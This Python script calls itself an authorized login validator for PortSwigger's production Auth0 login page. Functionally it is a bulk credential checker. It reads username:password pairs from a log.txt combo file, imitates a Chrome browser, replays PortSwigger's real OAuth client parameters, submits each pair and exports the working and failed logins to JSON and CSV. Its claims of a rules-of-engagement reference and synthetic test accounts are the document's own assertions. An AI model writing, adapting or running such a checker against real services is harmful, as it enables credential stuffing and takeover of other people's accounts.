#!/usr/bin/env python3
"""
PortSwigger Login Validator - Authorized Security Assessment Tool
Reference: ROE-2026-PSW-042-V5
Lead Assessor: Engin Demir (luckybuke5353@gmail.com)
"""

import requests
import time
import json
import urllib.parse
import re
from typing import Dict, Tuple, Optional
from datetime import datetime
import sys

class PortSwiggerLoginChecker:
    """
    Authorized login validation tool for PortSwigger penetration testing.
    Complies with ROE rate limits and scope constraints.
    """

    def __init__(self, rate_limit: float = 0.2, debug: bool = False):
        """
        Initialize the checker with rate limiting (5 req/sec = 0.2s per request).

        Args:
            rate_limit: Minimum seconds between requests (default: 0.2 = 5 req/sec)
            debug: Enable verbose HTTP debugging (default: False)
        """
        self.base_url = "https://login.portswigger.net"
        self.rate_limit = rate_limit
        self.last_request_time = 0
        self.debug = debug

        # Session headers based on your captured request
        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.portswigger.net",
            "Priority": "u=0, i",
            "Referer": "https://login.portswigger.net/u/login",
            "Sec-CH-UA": '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"macOS"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
        }

        self.session = requests.Session()
        self.test_results = []

    def _enforce_rate_limit(self) -> None:
        """Enforce maximum 5 requests/second (ROE compliance)."""
        elapsed = time.time() - self.last_request_time
        if elapsed < self.rate_limit:
            time.sleep(self.rate_limit - elapsed)
        self.last_request_time = time.time()

    def _extract_form_fields_from_html(self, html_content: str) -> Dict[str, str]:
        """
        Extract all form fields from login form HTML.

        Auth0 may require additional hidden fields beyond just state.

        Args:
            html_content: HTML response from GET /u/login

        Returns:
            Dictionary of form field names and values
        """
        fields = {}

        # Extract all hidden input fields
        # Pattern: <input type="hidden" name="fieldname" value="fieldvalue" />
        # More flexible pattern to handle various attribute orders
        hidden_inputs = re.findall(r'<input[^>]*type\s*=\s*["\']?hidden["\']?[^>]*>', html_content, re.IGNORECASE)

        for input_tag in hidden_inputs:
            # Extract name - handle various quote styles
            name_match = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)["\']?', input_tag, re.IGNORECASE)
            # Extract value - handle empty values
            value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', input_tag)

            if not value_match:
                # Try without quotes for values
                value_match = re.search(r'value\s*=\s*([^"\'\s>]+)', input_tag)

            if name_match:
                field_name = name_match.group(1)
                field_value = value_match.group(1) if value_match else ""
                fields[field_name] = field_value

                if self.debug and field_name in ["state", "code_challenge", "nonce"]:
                    print(f"[DEBUG]   Field '{field_name}': {field_value[:40] if len(field_value) > 40 else field_value}")

        return fields

    def _extract_state_from_html(self, html_content: str) -> Optional[str]:
        """
        Extract state parameter from login form HTML.

        Auth0 requires state parameter to be present and valid.

        Args:
            html_content: HTML response from GET /u/login

        Returns:
            State parameter value or None
        """
        form_fields = self._extract_form_fields_from_html(html_content)
        if "state" in form_fields:
            return form_fields["state"]

        # Try alternative patterns if not found in hidden inputs
        state_match = re.search(r'name=["\']state["\'].*?value=["\']([^"\']+)["\']', html_content, re.IGNORECASE | re.DOTALL)
        if state_match:
            return state_match.group(1)

        state_match = re.search(r'state["\']?\s*:\s*["\']([^"\']+)["\']', html_content)
        if state_match:
            return state_match.group(1)

        return None

    def _check_redirect_for_errors(self, redirect_url: str) -> tuple:
        """
        Analyze redirect URL for error indicators.

        Checks for OAuth/Auth0 error responses by looking for:
        1. /error path in redirect URL
        2. error= parameter with a non-empty error value

        Args:
            redirect_url: The Location header from redirect response

        Returns:
            Tuple of (is_error, error_details)
        """
        error_details = {}

        # Check if redirect is to an error endpoint
        if "/error" in redirect_url.lower():
            # Extract error parameter if present
            if "error=" in redirect_url:
                try:
                    error_start = redirect_url.find("error=") + 6
                    error_end = redirect_url.find("&", error_start)
                    if error_end == -1:
                        error_end = len(redirect_url)
                    error_value = redirect_url[error_start:error_end].strip()

                    # Only flag as error if error parameter has a value
                    if error_value and error_value not in ["", "null", "undefined"]:
                        error_details["error"] = error_value
                    else:
                        # Empty error parameter = likely success redirect
                        return False, {}
                except:
                    pass

            # Extract error description if present
            if "error_description=" in redirect_url:
                try:
                    desc_start = redirect_url.find("error_description=") + 18
                    desc_end = redirect_url.find("&", desc_start)
                    if desc_end == -1:
                        desc_end = len(redirect_url)
                    error_details["description"] = urllib.parse.unquote(redirect_url[desc_start:desc_end])
                except:
                    pass

            # If we found error details, it's an error
            if error_details:
                return True, error_details

        return False, {}

    def _get_fresh_state(self) -> Optional[str]:
        """
        Obtain a fresh state parameter by initiating OAuth2 authorization flow.
        Uses PortSwigger's actual OAuth2/OIDC configuration.

        Returns:
            Fresh state parameter or None if unable to obtain
        """
        self._enforce_rate_limit()

        # Start fresh - clear any existing session to force login prompt
        if self.debug:
            print(f"[DEBUG] Clearing session cookies for fresh OAuth flow...")
        self.session.cookies.clear()

        try:
            # PortSwigger's actual OAuth2/OIDC authorization parameters
            # Using response_mode=query for redirects instead of form_post
            auth_params = {
                "client_id": "F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz",
                "redirect_uri": "https://portswigger.net/signin-oidc",
                "response_type": "code",
                "scope": "openid profile email",
                "code_challenge": "BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk",
                "code_challenge_method": "S256",
                "response_mode": "query",  # Changed from form_post to get redirects
                "nonce": str(int(time.time())) + "." + str(int(time.time() * 1000000))[:24],
                "auth0Client": "eyJuYW1lIjoiYXNwbmV0Y29yZS1hdXRoZW50aWNhdGlvbiIsInZlcnNpb24iOiIxLjUuMCJ9"
            }

            auth_url = f"{self.base_url}/authorize"

            if self.debug:
                print(f"[DEBUG] GET /authorize with correct PortSwigger OAuth params...")

            # Request authorization endpoint
            auth_response = self.session.get(
                auth_url,
                params=auth_params,
                headers=self.headers,
                timeout=10,
                allow_redirects=False
            )

            if self.debug:
                print(f"[DEBUG] /authorize response: {auth_response.status_code}")

            # Check if we got redirected
            if auth_response.status_code in [301, 302, 303, 307, 308]:
                redirect_url = auth_response.headers.get("Location", "")
                if self.debug:
                    print(f"[DEBUG] /authorize redirected to: {redirect_url[:120]}")

                # Check if we were redirected to /u/login (need to login)
                if redirect_url and "/u/login?state=" in redirect_url:
                    state_match = re.search(r'state=([^&]+)', redirect_url)
                    if state_match:
                        fresh_state = state_match.group(1)
                        if self.debug:
                            print(f"[DEBUG] ✓ Extracted fresh OAuth state: {fresh_state[:40]}...")
                        return fresh_state

                # If redirected to callback (already logged in), try direct /u/login
                if redirect_url and "signin-oidc" in redirect_url:
                    if self.debug:
                        print(f"[DEBUG] Already authenticated, trying direct /u/login...")
                    # Try accessing /u/login directly without OAuth
                    self._enforce_rate_limit()
                    direct_response = self.session.get(
                        f"{self.base_url}/u/login",
                        headers=self.headers,
                        timeout=10,
                        allow_redirects=False
                    )
                    if self.debug:
                        print(f"[DEBUG] Direct /u/login response: {direct_response.status_code}")

                    # Extract state from direct response if available
                    if direct_response.status_code == 200:
                        state_match = re.search(r'name=["\']state["\'][^>]*value=["\']([^"\']+)["\']', direct_response.text)
                        if state_match:
                            fresh_state = state_match.group(1)
                            if self.debug:
                                print(f"[DEBUG] ✓ Extracted state from direct /u/login: {fresh_state[:40]}...")
                            return fresh_state

            # Try to extract state from HTML form if response is 200 (form_post mode)
            elif auth_response.status_code == 200:
                if self.debug:
                    print(f"[DEBUG] /authorize returned HTML form (form_post mode), extracting state...")

                # Look for hidden input with state value
                state_match = re.search(r'name=["\']state["\'][^>]*value=["\']([^"\']+)["\']', auth_response.text)
                if state_match:
                    fresh_state = state_match.group(1)
                    if self.debug:
                        print(f"[DEBUG] ✓ Extracted state from form: {fresh_state[:40]}...")
                    return fresh_state

                # Also try to extract from script/JSON
                state_match = re.search(r'state["\']?\s*:\s*["\']([^"\']+)["\']', auth_response.text)
                if state_match:
                    fresh_state = state_match.group(1)
                    if self.debug:
                        print(f"[DEBUG] ✓ Extracted state from JSON: {fresh_state[:40]}...")
                    return fresh_state

        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error getting fresh state: {e}")

        return None

    def check_login(self, username: str, password: str, state: Optional[str] = None) -> Dict:
        """
        Test a single login attempt against the authorized endpoint.

        Args:
            username: Test account username (MUST be synthetic/test account)
            password: Test account password
            state: Optional state parameter from authentication flow

        Returns:
            Dictionary with test results including status code and response indicators
        """
        self._enforce_rate_limit()

        result = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "endpoint": self.base_url,
            "status": "UNKNOWN"
        }

        try:
            # Step 0: If no state provided, fetch fresh one from OAuth authorize flow
            if not state:
                if self.debug:
                    print(f"\n[DEBUG] No state provided - fetching fresh OAuth state...")
                state = self._get_fresh_state()
                if not state:
                    result["status"] = "ERROR"
                    result["error"] = "Could not obtain fresh OAuth state. Please provide one manually."
                    self.test_results.append(result)
                    return result

            # Step 1: GET /u/login with state to initialize Auth0 session
            # This sets up Auth0 cookies and retrieves the login form
            login_url = f"{self.base_url}/u/login?state={state}"

            if self.debug:
                print(f"\n[DEBUG] GET /u/login?state={state[:50]}...")

            init_response = self.session.get(
                login_url,
                headers=self.headers,
                timeout=10,
                allow_redirects=False
            )

            if self.debug:
                print(f"[DEBUG] Response Status: {init_response.status_code}")
                print(f"[DEBUG] Cookies: {dict(self.session.cookies)}")
                print(f"[DEBUG] Response Headers: {dict(init_response.headers)}")

            # If we get a redirect, follow it to get to the actual login form
            if init_response.status_code in [301, 302, 303, 307, 308]:
                redirect_url = init_response.headers.get("Location")
                if self.debug:
                    print(f"[DEBUG] Initial redirect detected, following to: {redirect_url[:100]}...")

                if redirect_url:
                    # Make relative URLs absolute
                    if redirect_url.startswith("/"):
                        redirect_url = f"https://login.portswigger.net{redirect_url}"
                    elif not redirect_url.startswith("http"):
                        redirect_url = f"{self.base_url}/{redirect_url}"

                    init_response = self.session.get(
                        redirect_url,
                        headers=self.headers,
                        timeout=10,
                        allow_redirects=False
                    )

                    if self.debug:
                        print(f"[DEBUG] Follow redirect response status: {init_response.status_code}")

                    # If we get ANOTHER redirect, follow that too
                    if init_response.status_code in [301, 302, 303, 307, 308]:
                        redirect_url = init_response.headers.get("Location")
                        if self.debug:
                            print(f"[DEBUG] Second redirect detected, following to: {redirect_url[:100]}...")

                        if redirect_url:
                            if redirect_url.startswith("/"):
                                redirect_url = f"https://login.portswigger.net{redirect_url}"
                            elif not redirect_url.startswith("http"):
                                redirect_url = f"{self.base_url}/{redirect_url}"

                            init_response = self.session.get(
                                redirect_url,
                                headers=self.headers,
                                timeout=10,
                                allow_redirects=False
                            )

            self._enforce_rate_limit()

            # Step 2: Extract ALL form fields from HTML (state + any hidden fields)
            extracted_fields = self._extract_form_fields_from_html(init_response.text)
            extracted_state = state or extracted_fields.get("state")

            if extracted_fields:
                result["extracted_fields"] = len(extracted_fields)
                if self.debug:
                    print(f"[DEBUG] Extracted form fields: {list(extracted_fields.keys())}")

            # Step 3: Prepare login payload with all extracted fields
            payload = extracted_fields.copy()  # Start with extracted fields

            # Add/override with credentials
            payload["username"] = username
            payload["password"] = password

            # Add action if not already in form
            if "action" not in payload:
                payload["action"] = "default"

            # Override state if explicitly provided
            if state:
                payload["state"] = state
            elif extracted_state:
                payload["state"] = extracted_state

            result["has_state"] = bool(payload.get("state"))

            if self.debug:
                print(f"\n[DEBUG] POST /u/login Payload:")
                for key, value in payload.items():
                    if key in ["password"]:
                        print(f"  {key}: [REDACTED]")
                    else:
                        val_preview = value[:50] + "..." if len(value) > 50 else value
                        print(f"  {key}: {val_preview}")
                print(f"[DEBUG] Session Cookies Before POST: {dict(self.session.cookies)}")

            # Step 4: Send login request (session maintains cookies)
            # Try POST without state in URL - state should be in form data only
            login_url = f"{self.base_url}/u/login"

            if self.debug:
                print(f"[DEBUG] POST URL: {login_url}")
                print(f"[DEBUG] Payload fields: {list(payload.keys())}")

            response = self.session.post(
                login_url,
                data=payload,
                headers=self.headers,
                timeout=10,
                allow_redirects=False
            )

            if self.debug:
                print(f"\n[DEBUG] POST Response Status: {response.status_code}")
                print(f"[DEBUG] Session Cookies After POST: {dict(self.session.cookies)}")
                if response.status_code == 400:
                    print(f"[DEBUG] ERROR Response (400):")
                    print(f"[DEBUG] Response body (first 500 chars): {response.text[:500]}")
                if response.status_code in [302, 303]:
                    print(f"[DEBUG] Redirect Location: {response.headers.get('Location', 'N/A')}")

            result["status_code"] = response.status_code
            result["response_length"] = len(response.text)

            # Analyze response indicators
            if response.status_code == 302 or response.status_code == 303:
                redirect_location = response.headers.get("Location", "N/A")
                result["redirect_location"] = redirect_location

                # Check if redirect contains error parameters
                has_error, error_details = self._check_redirect_for_errors(redirect_location)

                if has_error:
                    result["status"] = "FAILED_LOGIN"
                    result["error_details"] = error_details
                else:
                    # Successful login redirects without errors
                    result["status"] = "SUCCESS"

            elif response.status_code == 200:
                # Failed login stays on login page
                if "error" in response.text.lower() or "invalid" in response.text.lower():
                    result["status"] = "FAILED_LOGIN"
                else:
                    result["status"] = "LOGIN_PAGE"

            elif response.status_code == 400:
                # 400 Bad Request from Auth0 = invalid credentials
                result["status"] = "FAILED_LOGIN"
                result["error"] = "Invalid credentials (HTTP 400)"

            elif response.status_code == 429:
                result["status"] = "RATE_LIMITED"
            else:
                result["status"] = f"HTTP_{response.status_code}"

            # Check for security indicators in response
            if "csrf" in response.text.lower():
                result["has_csrf_token"] = True
            if "password" in response.text.lower():
                result["login_form_present"] = True

        except requests.Timeout as e:
            result["status"] = "TIMEOUT"
            result["error"] = str(e)
            if self.debug:
                print(f"[DEBUG] Timeout Error: {str(e)}")
        except requests.ConnectionError as e:
            result["status"] = "CONNECTION_ERROR"
            result["error"] = str(e)
            if self.debug:
                print(f"[DEBUG] Connection Error: {str(e)}")
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            if self.debug:
                print(f"[DEBUG] Exception Error: {str(e)}")

        self.test_results.append(result)
        return result

    def check_multiple_accounts(self, credentials_list: list) -> list:
        """
        Test multiple accounts sequentially with rate limiting.

        Args:
            credentials_list: List of dicts with 'username' and 'password' keys

        Returns:
            List of test results
        """
        print(f"\n[*] Starting login validation for {len(credentials_list)} account(s)...")
        print(f"[*] Rate limit: {1/self.rate_limit:.1f} requests/second (ROE compliant)")
        print(f"[*] Authorized Testing Window: July 26 - August 10, 2026")
        print("-" * 70)

        for idx, creds in enumerate(credentials_list, 1):
            username = creds.get("username", "")
            password = creds.get("password", "")
            state = creds.get("state")

            print(f"\n[{idx}/{len(credentials_list)}] Testing: {username}")
            result = self.check_login(username, password, state)

            print(f"    Status: {result['status']}")
            print(f"    Response Code: {result.get('status_code', 'N/A')}")

            # Show error message
            if result.get('error'):
                print(f"    Error Message: {result['error']}")

            if result.get('redirect_location'):
                print(f"    Redirect: {result['redirect_location']}")
            if result.get('error_details'):
                if result['error_details'].get('error'):
                    print(f"    OAuth Error: {result['error_details']['error']}")
                if result['error_details'].get('description'):
                    print(f"    Description: {result['error_details']['description']}")

        print("\n" + "=" * 70)
        return self.test_results

    def export_results(self, filename: str = "login_test_results.json") -> None:
        """Export test results to JSON file for reporting."""
        with open(filename, 'w') as f:
            json.dump(self.test_results, f, indent=2)
        print(f"[+] Results exported to: {filename}")

    def get_summary(self) -> Dict:
        """Generate summary statistics from test results."""
        if not self.test_results:
            return {"total_tests": 0}

        summary = {
            "total_tests": len(self.test_results),
            "successful": sum(1 for r in self.test_results if r["status"] == "SUCCESS"),
            "failed": sum(1 for r in self.test_results if r["status"] == "FAILED_LOGIN"),
            "errors": sum(1 for r in self.test_results if r["status"] in ["ERROR", "TIMEOUT", "CONNECTION_ERROR"]),
            "rate_limited": sum(1 for r in self.test_results if r["status"] == "RATE_LIMITED")
        }
        return summary


def main():
    """Read credentials from log.txt and test each one."""

    # Enable debug mode to see all HTTP requests/responses
    # Set to True to see detailed HTTP debugging for troubleshooting
    debug_mode = True
    checker = PortSwiggerLoginChecker(rate_limit=0.2, debug=debug_mode)  # 5 req/sec compliance

    # Read credentials from log.txt (format: username:password, one per line)
    log_file = "log.txt"
    test_credentials = []

    try:
        with open(log_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):  # Skip empty lines and comments
                    continue

                if ":" in line:
                    parts = line.split(":", 1)  # Split only on first colon
                    username = parts[0].strip()
                    password = parts[1].strip()
                    test_credentials.append({
                        "username": username,
                        "password": password
                    })

        if not test_credentials:
            print(f"[ERROR] No credentials found in {log_file}")
            print(f"[INFO] Create {log_file} with format: username:password (one per line)")
            return None

        print(f"[+] Loaded {len(test_credentials)} credential(s) from {log_file}\n")

    except FileNotFoundError:
        print(f"[ERROR] File not found: {log_file}")
        print(f"[INFO] Create {log_file} with format:")
        print(f"  user1@example.com:password1")
        print(f"  user2@example.com:password2")
        return None

    # Run validation
    results = checker.check_multiple_accounts(test_credentials)

    # Print summary
    summary = checker.get_summary()
    print(f"\n[SUMMARY]")
    print(f"Total Tests: {summary['total_tests']}")
    print(f"Successful: {summary['successful']}")
    print(f"Failed: {summary['failed']}")
    print(f"Errors: {summary['errors']}")
    print(f"Rate Limited: {summary['rate_limited']}")

    # Export results to JSON
    json_file = "portswigger_login_results.json"
    checker.export_results(json_file)

    # Export results to CSV format for easy viewing
    csv_file = "portswigger_login_results.csv"
    with open(csv_file, 'w') as f:
        f.write("Username,Status,StatusCode,Timestamp,Details\n")
        for result in checker.test_results:
            username = result.get('username', '')
            status = result.get('status', 'UNKNOWN')
            status_code = result.get('status_code', 'N/A')
            timestamp = result.get('timestamp', '')
            error = result.get('error', result.get('error_details', {}).get('error', ''))
            f.write(f'"{username}","{status}","{status_code}","{timestamp}","{error}"\n')

    print(f"[+] Results exported to: {json_file}")
    print(f"[+] Results exported to: {csv_file}")

    return summary


if __name__ == "__main__":
    main()
